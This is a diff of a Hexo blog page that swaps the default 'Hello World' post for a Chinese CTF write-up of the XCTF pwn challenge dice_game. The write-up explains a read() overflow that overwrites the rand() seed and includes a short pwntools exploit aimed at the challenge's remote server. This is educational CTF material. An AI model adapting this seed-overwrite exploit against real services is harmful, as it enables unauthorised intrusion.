@@ -79,16 +79,23 @@
 
 
 
-<meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta name="description" content="攻防世界进阶区">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="https://caiii-vegtable.github.io/2020/07/19/hello-world/index.html">
+<meta property="og:title" content="xctf-adv">
+<meta property="og:url" content="https://caiii-vegtable.github.io/2020/07/24/xctf-adv/index.html">
 <meta property="og:site_name" content="inHaus&#39;blog">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
-<meta property="article:published_time" content="2020-07-19T01:22:21.957Z">
-<meta property="article:modified_time" content="2020-07-19T01:22:21.957Z">
+<meta property="og:description" content="攻防世界进阶区">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/check.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/main.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/cat.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/guess.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/stack.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/out.png">
+<meta property="article:published_time" content="2020-07-24T01:25:11.000Z">
+<meta property="article:modified_time" content="2020-07-24T02:27:42.438Z">
 <meta property="article:author" content="caiii-vegtable">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://caiii-vegtable.github.io/image/xctf-adv/check.png">
 
 
 
@@ -118,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="https://caiii-vegtable.github.io/2020/07/19/hello-world/"/>
+  <link rel="canonical" href="https://caiii-vegtable.github.io/2020/07/24/xctf-adv/"/>
 
 
 
 
 
-  <title>Hello World | inHaus'blog</title>
+  <title>xctf-adv | inHaus'blog</title>
   
 
 
@@ -231,7 +238,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://caiii-vegtable.github.io/2020/07/19/hello-world/">
+    <link itemprop="mainEntityOfPage" href="https://caiii-vegtable.github.io/2020/07/24/xctf-adv/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="caiii-vegtable">
@@ -248,7 +255,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Hello World</h1>
+          <h1 class="post-title" itemprop="name headline">xctf-adv</h1>
         
 
         <div class="post-meta">
@@ -260,8 +267,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-07-19T09:22:21+08:00">
-                2020-07-19
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-07-24T09:25:11+08:00">
+                2020-07-24
               </time>
             
 
@@ -298,19 +305,29 @@
       
 
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+        <h1 id="攻防世界进阶区"><a href="#攻防世界进阶区" class="headerlink" title="攻防世界进阶区"></a>攻防世界进阶区</h1><a id="more"></a>
 
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<h2 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h2><p>查看保护</p>
+<p><img src="/image/xctf-adv/check.png" alt="check"></p>
+<p>main函数</p>
+<p><img src="/image/xctf-adv/main.png" alt="main"></p>
+<p>先输入name，read函数读入0x50，不会溢出。</p>
+<p>srand(seed[0])为随机数提供种子。如果种子不变，那么rand()产生的随机数就可以预测。</p>
+<p>只有v5 == 1，循环50次才会进入sub_B28函数</p>
+<p>sub_B28函数</p>
+<p><img src="/image/xctf-adv/cat.png" alt="cat"></p>
+<p>打印了flag</p>
+<p>sub_A20函数</p>
+<p><img src="/image/xctf-adv/guess.png" alt="guess"></p>
+<p>输入1~6的整数，和v2 = rand()%6 +1相等才能返回1。</p>
+<p>查看栈</p>
+<p><img src="/image/xctf-adv/stack.png" alt="stack"></p>
+<p>read可以覆盖seed。所以覆盖seed为常数，偏移为0x40</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> * <span class="comment">#ctypes是Python内建的用于调用动态链接库函数的功能模块。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process('./dice_game')</span></span><br><span class="line">p= remote(<span class="string">'220.249.52.133'</span>,<span class="number">40127</span>)</span><br><span class="line"></span><br><span class="line">libc=cdll.LoadLibrary(<span class="string">"libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x40</span>+p64(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">a=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    a.append(libc.rand()%<span class="number">6</span>+<span class="number">1</span>)</span><br><span class="line">print(a)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(str(i))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+<p>效果</p>
+<p><img src="/image/xctf-adv/out.png" alt="out"></p>
 
       
     </div>
@@ -335,8 +352,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/05/03/xctf/" rel="next" title="xctf">
-                <i class="fa fa-chevron-left"></i> xctf
+              <a href="/2020/07/20/buu/" rel="next" title="buu">
+                <i class="fa fa-chevron-left"></i> buu
               </a>
             
           </div>
@@ -344,10 +361,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/07/19/text/" rel="prev" title="text">
-                text <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -465,7 +478,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#攻防世界进阶区"><span class="nav-text">攻防世界进阶区</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#dice-game"><span class="nav-text">dice_game</span></a></li></ol></li></ol></div>
             
 
           </div>
